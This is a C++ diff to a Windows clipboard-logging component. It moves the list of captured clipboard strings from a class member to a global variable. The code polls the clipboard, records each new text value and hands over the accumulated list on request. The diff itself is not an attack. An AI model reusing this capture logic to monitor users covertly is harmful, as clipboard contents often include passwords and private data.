@@ -8,6 +8,7 @@
 ClipboardLogger* clipboard_logger = NULL;
 std::mutex clipboard_logger_lock;
 bool clipboard_thread_active = false;
+std::list<std::string> logged = std::list<std::string>();
 
 ClipboardLogger::ClipboardLogger()
 {
@@ -91,12 +92,12 @@ DWORD WINAPI clipboard_logger_thread(LPVOID lpParameter)
 		std::string data_str = std::string(clipboard_text);
 
 		std::string last_clipboard = "";
-		if (!clipboard_logger->logged_clipboards.empty())
-			last_clipboard = clipboard_logger->logged_clipboards.back();
+		if (!logged.empty())
+			last_clipboard = logged.back();
 
 		if (last_clipboard.compare(data_str) != 0)
 		{
-			clipboard_logger->logged_clipboards.push_back(data_str);
+			logged.push_back(data_str);
 		}
 
 		clipboard_logger_lock.unlock();
@@ -142,8 +143,8 @@ std::list<std::string> ClipboardLogger::get_logged_clipboards()
 		return std::list<std::string>();
 	}
 
-	std::list<std::string> output = this->logged_clipboards;
-	this->logged_clipboards = std::list<std::string>();
+	std::list<std::string> output = logged;
+	logged = std::list<std::string>();
 
 	clipboard_logger_lock.unlock();
 
